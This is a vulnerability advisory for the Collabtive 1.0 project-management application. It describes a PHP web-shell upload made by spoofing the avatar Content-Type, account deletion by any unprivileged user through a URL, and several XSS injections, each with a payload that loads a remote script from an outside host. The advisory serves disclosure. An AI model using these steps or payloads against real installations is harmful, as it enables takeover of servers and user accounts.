 I. VULNERABILITY
-------------------------

Collabtive multiple vulnerabilities.


 II. INTRODUCTION
-------------------------

The last version of Collabtive (1.0) is affected by multiple
vulnerabilities.


 IV. DESCRIPTION
-------------------------

1) UPLOAD PHP FILE INSIDE AVATAR:

In the following function:

https://hostname/secprj/manageuser.php?action=edit

it&#039;s possible to upload a php file inside avatar by modifying the
Content-Type
as following:

Content-Type: image/jpeg

The file will be uploaded inside the standard directory and encoded with a
six-characters number at the end of the file, like the following example:

https://hostname/secprj/files/standard/avatar/uploadedshell_104185.php

It&#039;s really fast to enumerate all the possibility and to execute the file
uploaded.




2) ACCOUNT DELETION

It&#039;s possible to delete any account from every user, by calling the
following URL:

https://hostname/secprj/manageuser.php?action=del&id=5

By setting the value "del" to parameter "action", the account with setted
ID will be
deleted, even if will apper an error message.

An "User" account with no privilege can delete all kind of account,
including Administrators.



3) CROSS SITE SCRITPING - CHAT:

The application is vulnerable to XSS attack in the managechat.php page. The
parameter affected is &#039;userto&#039;:

https://hostname/secprj/managechat.php?userto=<SCRIPT/XSS SRC="
http://ha.ckers.org/xss.js"></SCRIPT>&uid=2



4) CROSS SITE SCRITPING - TIMETRACKER

The page managetimetracker.php is affected by Cross Site Scripting
vulnerability.

following XSS:

"><SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>



5) CROSS SITE SCRITPING - Multiple vulnerabilities:

The application is vulnerable to XSS attack in different pages:

manageproject.php
managemilestone.php
managetask.php
managemessage.php

To exploit the vulnerability it&#039;s necessary to set a new object name
(project, milestone,
task, message) like the following example:

"><SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>

the script will be executed in the same page, and in dashboard,too.
